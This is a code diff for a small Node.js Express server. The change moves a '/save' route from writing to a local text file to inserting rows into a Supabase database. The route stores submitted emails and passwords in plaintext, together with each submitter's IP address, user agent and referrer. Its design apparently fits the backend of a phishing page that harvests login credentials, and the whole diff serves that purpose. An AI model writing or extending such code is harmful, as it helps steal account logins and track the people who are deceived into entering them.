@@ -1,9 +1,13 @@
 const express = require('express');
-const fs = require('fs');
-const path = require('path');
+const { createClient } = require('@supabase/supabase-js');
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
+
+// Supabase setup
+const supabaseUrl = process.env.SUPABASE_URL;
+const supabaseKey = process.env.SUPABASE_ANON_KEY;
+const supabase = createClient(supabaseUrl, supabaseKey);
 
 // Middleware to parse JSON
 app.use(express.json());
@@ -12,16 +16,35 @@ app.use(express.json());
 app.use(express.static('.'));
 
 // Route to save credentials
-app.post('/save', (req, res) => {
+app.post('/save', async (req, res) => {
   const { email, password } = req.body;
   const timestamp = new Date().toISOString();
-  const content = `Email: ${email}\nPassword: ${password}\nSaved: ${timestamp}\n\n`;
+  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  const userAgent = req.get('User-Agent');
+  const referrer = req.get('Referer');
 
   try {
-    fs.appendFileSync(path.join(__dirname, 'credentials.txt'), content);
-    res.json({ success: true, message: 'Credentials saved successfully' });
+    const { data, error } = await supabase
+      .from('credentials')
+      .insert([
+        {
+          email,
+          password,
+          timestamp,
+          ip,
+          user_agent: userAgent,
+          referrer
+        }
+      ]);
+
+    if (error) {
+      console.error('Error saving to database:', error);
+      res.status(500).json({ success: false, message: 'Failed to save credentials' });
+    } else {
+      res.json({ success: true, message: 'Credentials saved successfully' });
+    }
   } catch (error) {
-    console.error('Error saving credentials:', error);
+    console.error('Error:', error);
     res.status(500).json({ success: false, message: 'Failed to save credentials' });
   }
 });
